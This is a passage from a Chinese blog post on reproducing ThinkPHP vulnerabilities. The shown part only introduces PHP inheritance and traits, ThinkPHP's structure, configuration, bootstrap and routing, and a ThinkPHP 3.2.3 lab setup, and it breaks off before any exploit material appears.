    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">smoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"i got Yukka woxiangchou\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">child</span> <span class="token keyword">extends</span> <span class="token class-name">father</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"Alice"</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"i am child \n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">parentsay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$child</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">child</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$child</span><span class="token operator">-></span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$child</span><span class="token operator">-></span><span class="token function">smoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$child</span><span class="token operator">-></span><span class="token function">parentsay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$child</span><span class="token operator">-></span><span class="token property">hobby</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231108221049816.png" alt="image-20231108221049816"></p>
<p>上面的demo中child继承了father，和java一样，属性和方法也被继承下来了，子类可以覆写父类的方法，子类也可以通过<code>parent::</code>关键字访问父类被覆盖的方法</p>
<hr>
<h2 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h2><p>使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"test\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">impl</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"impl\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$t</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">impl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">-></span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231108221515538.png" alt="image-20231108221515538"></p>
<p>test是一个用trait修饰的类，所以我们只要在impl类中use了test这个类，我们就可以调用其中的方法，类似于类的继承</p>
<p>这里还有一个特性：</p>
<p>1.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">np1<span class="token punctuation">\</span>A</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">np2<span class="token punctuation">\</span>A<span class="token punctuation">\</span>Aris</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1oud</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token package">Aris</span><span class="token punctuation">;</span>	<span class="token comment">// 复用Aris类</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">np2<span class="token punctuation">\</span>A</span><span class="token punctuation">;</span>
<span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">np1<span class="token punctuation">\</span>A<span class="token punctuation">\</span>C1oud</span><span class="token punctuation">;</span>
<span class="token keyword">trait</span> <span class="token class-name-definition class-name">Aris</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"tostring\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C1oud</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231108222205101.png" alt="image-20231108222205101"></p>
<p>可以看到我们在C1oud类里面复用了Aris这个类，然后能够触发<code>__toString</code>魔术方法，这一点在tp5的反序列化漏洞中有出现过</p>
<hr>
<h1 id="ThinkPHP开发手册"><a href="#ThinkPHP开发手册" class="headerlink" title="ThinkPHP开发手册"></a>ThinkPHP开发手册</h1><p>官方文档：<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/doc">https://www.thinkphp.cn/doc</a></p>
<h2 id="模块化设计"><a href="#模块化设计" class="headerlink" title="模块化设计"></a>模块化设计</h2><p>一个完整的ThinkPHP应用基于<strong>模块&#x2F;控制器&#x2F;操作</strong>设计</p>
<p>一个典型的URL访问规则是（我们以默认的PATHINFO模式为例说明，当然也可以支持普通的URL模式）：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php（或者其他应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>首先先了解一下几个概念：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>应用（Application）</td>
<td>基于同一个入口文件访问的项目我们称之为一个应用。</td>
</tr>
<tr>
<td>模块（Module）</td>
<td>一个应用下面可以包含多个模块，每个模块在应用目录下面都是一个独立的子目录。</td>
</tr>
<tr>
<td>控制器（Controller）</td>
<td>每个模块可以包含多个控制器，一个控制器通常体现为一个控制器类。</td>
</tr>
<tr>
<td>操作</td>
<td>每个控制器类可以包含多个操作方法，也可能是绑定的某个操作类，每个操作是URL访问的最小单元。</td>
</tr>
</tbody></table>
<p>基本的模块结构：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Application      默认应用目录（可以设置）
├─Common         公共模块（不能直接访问）
├─Home           前台模块
├─Admin          后台模块
├─...            其他更多模块
├─Runtime        默认运行时目录（可以设置）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>模块内部：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">├─Module         模块目录
│  ├─Conf        配置文件目录
│  ├─Common      公共函数目录
│  ├─Controller  控制器目录
│  ├─Model       模型目录
│  ├─Logic       逻辑目录（可选）
│  ├─Service     Service目录（可选）
│  ... 更多分层目录可选
│  └─View        视图目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">A 快速实例化Action类库
B 执行行为类
C 配置参数存取方法
D 快速实例化Model类库
F 快速简单文本数据存取方法
L 语言参数存取方法
M 快速高性能实例化模型
R 快速远程调用Action类方法
S 快速缓存存取方法
U URL动态生成和重定向方法
W 快速Widget输出方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="目录结构（5-0）"><a href="#目录结构（5-0）" class="headerlink" title="目录结构（5.0）"></a>目录结构（5.0）</h2><p>单应用模式：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">thinkphp/                     根目录
    /application              应用目录 
        /index                应用index模块目录 
    command.php               命令行命令配置目录
    config.php                应用配置文件
    databse.php               应用数据库配置文件
    route.php                 应用路由配置文件
        
    /public                   入口目录
        /static               静态资源目录
        .htacess              apache服务器配置
        index.php             默认入口文件
        robots.txt            爬虫协议文件
        router.php            php命令行服务器入口文件
    
    /vendor                   composer安装目录  
    build.php                 默认自动生成配置文件
    composer.json             composer安装配置文件
    console                   控制台入口文件
    
/vendor/topthink/framework    框架核心目录
        /extend               框架扩展目录
        /lang                 框架语言目录
        /library              框架核心目录
        /mode                 框架模式目录
        /tests                框架测试目录
        /tpl                  框架模板目录
        /vendor               第三方目录
        base.php              全局常量文件
        convention.php        全局配置文件
        helper.php            辅助函数文件
        start.php             框架引导入口
        think.php             框架引导文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>ThinkPHP框架中默认所有配置文件的定义格式均采用返回<strong>PHP数组</strong>的方式</p>
<p>格式：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//项目配置文件</span>
<span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'DEFAULT_MODULE'</span>     <span class="token operator">=></span> <span class="token string single-quoted-string">'Index'</span><span class="token punctuation">,</span> <span class="token comment">//默认模块</span>
    <span class="token string single-quoted-string">'URL_MODEL'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">,</span> <span class="token comment">//URL模式</span>
    <span class="token string single-quoted-string">'SESSION_AUTO_START'</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//是否开启session</span>
    <span class="token comment">//更多配置参数</span>
    <span class="token comment">//...</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注：二级参数配置区分大小写</p>
<h3 id="配置加载"><a href="#配置加载" class="headerlink" title="配置加载"></a>配置加载</h3><p>在ThinkPHP中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p>
<p><code>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</code></p>
<p>主要的配置：</p>
<ul>
<li><p>惯例配置：ThinkPHP&#x2F;Conf&#x2F;convention.php</p>
<p>按照大多数的使用对常用参数进行了默认配置</p>
</li>
<li><p>应用配置：Application&#x2F;Common&#x2F;Conf&#x2F;config.php</p>
<p>调用所有模块之前都会首先加载的公共配置文件</p>
</li>
<li><p>模块配置：Application&#x2F;当前模块名&#x2F;Conf&#x2F;config.php</p>
<p>每个模块会自动加载自己的配置文件</p>
</li>
<li><p>动态配置：在具体的操作方法里面，对某些参数进行动态配置</p>
<p><code>C(&#39;参数名称&#39;,&#39;新的参数值&#39;)</code></p>
</li>
</ul>
<h3 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h3><p>无论何种配置文件，定义了配置文件之后，都会统一使用系统提供的C方法（config）来读取已有的配置，这个方法可以在任何地方读取任何配置</p>
<p>用法：<code>C(&#39;参数名称&#39;)</code></p>
<p>例如，读取当前的URL模式配置参数：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$model</span> <span class="token operator">=</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'URL_MODEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 由于配置参数不区分大小写，因此下面的写法是等效的</span>
<span class="token comment">// $model = C('url_model');</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注：配置参数名称中不能含有 “.” 和特殊字符，允许字母、数字和下划线</p>
<h3 id="扩展配置"><a href="#扩展配置" class="headerlink" title="扩展配置"></a>扩展配置</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 加载扩展配置文件</span>
<span class="token string single-quoted-string">'LOAD_EXT_CONFIG'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'user,db'</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>假设<code>user.php</code> 和<code>db.php</code>分别用于用户配置和数据库配置</p>
<p>其中公共配置的加载在<code>Application/Common/Conf/user.php</code>和<code>Application/Common/Conf/db.php</code></p>
<hr>
<h2 id="框架引导start-php"><a href="#框架引导start-php" class="headerlink" title="框架引导start.php"></a>框架引导start.php</h2><p>thinkphp为单程序入口，这是 mvc 框架的特征，程序的入口在public目录下的index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 定义应用目录</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'APP_PATH'</span><span class="token punctuation">,</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../application/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 加载框架引导文件</span>
<span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../thinkphp/start.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>require</code>引入 thinkphp 的<code>start.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// ThinkPHP 引导文件</span>
<span class="token comment">// 1. 加载基础文件</span>
<span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/base.php'</span><span class="token punctuation">;</span>

<span class="token comment">// 2. 执行应用</span>
<span class="token class-name static-context">App</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>base.php(thinkphp/base.php)</code>中定义了一些常量，比如<code>ROOT_PATH</code>、<code>RUNTIME_PATH</code>、<code>LOG_PATH</code>等等，然后引入<code>Loader</code>类来自动加载</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">thinkphp<span class="token operator">/</span>base<span class="token operator">.</span>php<span class="token punctuation">:</span><span class="token number">37</span>
<span class="token comment">// 载入Loader类</span>
<span class="token keyword">require</span> <span class="token constant">CORE_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'Loader.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后在下面通过<code>.env</code>文件 putenv 环境变量，接下来都是加载一些配置文件</p>
<p>最后配置完返回 <code>thinkphp/start.php:19</code> 启动程序</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 2. 执行应用</span>
<span class="token class-name static-context">App</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h2 id="应用启动App-run"><a href="#应用启动App-run" class="headerlink" title="应用启动App::run()"></a>应用启动App::run()</h2><p><code>App::run()</code>是thinkphp程序的主要核心，在其中进行了初始化应用配置 –&gt; 模块&#x2F;控制器绑定 –&gt; 加载语言包 –&gt; 路由检查 –&gt; DEBUG记录 –&gt; exec()应用调度 –&gt; 输出客户端</p>
<p>（流程图均来自y4爷的博客）</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20191127226243.jpg" alt="1"></p>
<hr>
<h2 id="路由检查self-routeCheck"><a href="#路由检查self-routeCheck" class="headerlink" title="路由检查self::routeCheck()"></a>路由检查self::routeCheck()</h2><p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240309114324691.png" alt="image-20240309114324691"></p>
<h2 id="应用调度App-exec"><a href="#应用调度App-exec" class="headerlink" title="应用调度App::exec()"></a>应用调度App::exec()</h2><h2 id="请求处理Request类"><a href="#请求处理Request类" class="headerlink" title="请求处理Request类"></a>请求处理Request类</h2><p>请求类处于<code>thinkphp/library/think/Request.php</code>，而thinkphp有<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/144731">助手函数input()</a>来获取请求参数</p>
<p>Request类是一个获取请求类，thinkphp将多种请求的全局数组封装了一下，变为自己的函数，并且进行了过滤和强制类型转换，以此保证参数的安全性</p>
<h2 id="视图渲染View-php"><a href="#视图渲染View-php" class="headerlink" title="视图渲染View.php"></a>视图渲染View.php</h2><p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240309114426239.png" alt="image-20240309114426239"></p>
<hr>
<h2 id="URL访问"><a href="#URL访问" class="headerlink" title="URL访问"></a>URL访问</h2><p>见<a href="https://c1oudfl0w0.github.io/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/#URL%E6%A8%A1%E5%BC%8F">https://c1oudfl0w0.github.io/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/#URL%E6%A8%A1%E5%BC%8F</a></p>
<p>以tp6为例，其控制器为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>:) &lt;/h1>&lt;p> ThinkPHP V6&lt;br/>&lt;span style="font-size:30px">13载初心不改 - 你值得信赖的PHP框架&lt;/span>&lt;/p>&lt;/div>&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8">&lt;/script>&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js">&lt;/script>&lt;think id="eab4b9f840753f8e7">&lt;/think>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ThinkPHP6'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'hello,'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而路由route&#x2F;app.php为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>Route</span><span class="token punctuation">;</span>

<span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'think'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string single-quoted-string">'hello,ThinkPHP6!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hello/:name'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index/hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么当我们访问<code>/public/index.php/hello/a</code>时</p>
<p>会返回<code>hello,a</code></p>
<p>我们在这个控制器加上一个新的方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>那么访问<code>/public/index.php/index/test</code>时会返回<code>test</code></p>
<hr>
<h1 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a>ThinkPHP3</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网下载404了，找不到3.2.3的版本，只有3.2.4和3.2.5版本能下载</p>
<p>PHP版本要求：PHP5.3以上版本（<strong>注意：PHP5.3dev版本和PHP6均不支持</strong>）</p>
<p>Github获取：<a target="_blank" rel="noopener" href="https://github.com/liu21st/thinkphp">https://github.com/liu21st/thinkphp</a></p>
<p>composer获取3.2.3版本：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> create-project topthink/thinkphp:v3.2.3 tp3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>直接把下载的文件放在web根目录即可</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231226233817426.png" alt="image-20231226233817426"></p>
<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>数据库配置：配置当前模块配置文件(<code>Application/Home/Conf/config.php</code>)，也可以配置管理配置文件(<code>ThinkPHP/Conf/convention.php</code>)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
	<span class="token comment">//'配置项'=>'配置值'</span>

	<span class="token comment">//数据库配置信息</span>
	<span class="token string single-quoted-string">'DB_TYPE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'mysql'</span><span class="token punctuation">,</span> <span class="token comment">// 数据库类型</span>
	<span class="token string single-quoted-string">'DB_HOST'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token comment">// 服务器地址</span>
	<span class="token string single-quoted-string">'DB_NAME'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'TP3'</span><span class="token punctuation">,</span> <span class="token comment">// 数据库名</span>
	<span class="token string single-quoted-string">'DB_USER'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'tp3'</span><span class="token punctuation">,</span> <span class="token comment">// 用户名</span>
	<span class="token string single-quoted-string">'DB_PWD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'tp3tp3'</span><span class="token punctuation">,</span> <span class="token comment">// 密码</span>
	<span class="token string single-quoted-string">'DB_PORT'</span>   <span class="token operator">=></span> <span class="token number">3306</span><span class="token punctuation">,</span> <span class="token comment">// 端口</span>
	<span class="token string single-quoted-string">'DB_PARAMS'</span> <span class="token operator">=></span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 数据库连接参数</span>
	<span class="token string single-quoted-string">'DB_PREFIX'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'think_'</span><span class="token punctuation">,</span> <span class="token comment">// 数据库表前缀 </span>
	<span class="token string single-quoted-string">'DB_CHARSET'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span> <span class="token comment">// 字符集</span>
	<span class="token string single-quoted-string">'DB_DEBUG'</span>  <span class="token operator">=></span>  <span class="token constant boolean">FALSE</span><span class="token punctuation">,</span> <span class="token comment">// 数据库调试模式 开启后可以记录SQL日志</span>

<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>数据库那里也要配置一下，注意数据库表的前缀<del>（喜报：懒狗终于用上navicat了）</del></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231227004508160.png" alt="image-20231227004508160"></p>
<p>检验：修改<code>Application/Home/Controller/IndexController.class.php</code>的index方法</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
